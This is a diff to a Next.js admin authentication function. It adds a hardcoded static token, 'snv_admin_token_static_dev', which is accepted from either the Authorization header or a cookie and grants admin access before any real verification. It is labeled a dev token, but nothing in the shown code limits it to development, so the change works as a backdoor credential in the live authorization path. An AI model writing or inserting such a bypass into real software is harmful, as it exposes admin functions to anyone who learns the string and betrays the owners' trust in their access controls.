@@ -35,8 +35,16 @@ export async function requireAdminAuth(req: NextRequest): Promise<NextResponse |
   }
 
   try {
-    // Check Authorization Header if present
+    // Check for static admin dev token in header or cookie
     const authHeader = req.headers.get("authorization");
+    const adminCookie = req.cookies.get("snv_admin_token");
+    if (
+      authHeader === "Bearer snv_admin_token_static_dev" ||
+      adminCookie?.value === "snv_admin_token_static_dev"
+    ) {
+      return null; // Static Admin Token Authorized
+    }
+
     if (authHeader && authHeader.startsWith("Bearer ")) {
       const token = authHeader.substring(7);
       const { createService } = await import("@/lib/supabase/service");
